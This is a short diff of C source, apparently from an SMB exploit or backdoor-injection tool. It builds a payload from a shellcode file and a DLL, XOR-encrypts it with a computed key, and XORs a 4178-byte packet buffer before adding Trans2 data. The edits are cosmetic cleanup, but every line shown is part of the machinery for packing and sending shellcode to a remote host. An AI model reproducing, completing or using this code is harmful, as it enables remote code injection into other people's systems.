@@ -697,15 +697,16 @@ int main(int argc, char* argv[])
 	
 	//construct payload 
 	construct_payload(shellcode_file, dll_file, ordinal, &payload);
-		
-	//Xor the data buffer with the calculated key
-	int len = 0;
-	len = sizeof(payload.lpbData);
+
+	//XOR the data buffer with the calculated key
+	int len = sizeof(payload.lpbData);
 	unsigned char *encrypted;
 	encrypted = (unsigned char*)malloc(len+1);
+	memset(encrypted,0x00,len+1);
+	
 	for(i=0;i<len;i++)
 	{
-		encrypted[i] = payload.lpbData[i]^XorKey;
+		encrypted[i] = payload.lpbData[i] ^ XorKey;
         }
 
 	//build packet buffer with 4178 bytes in length
@@ -717,7 +718,7 @@ int main(int argc, char* argv[])
 	int bp;
 	for(bp=0;bp<4178;bp++)
 	{
-		big_packet[bp] = big_packet[bp]^XorKey;
+		big_packet[bp] = big_packet[bp] ^ XorKey;
         }
 
 	//Copy Trans2 Information
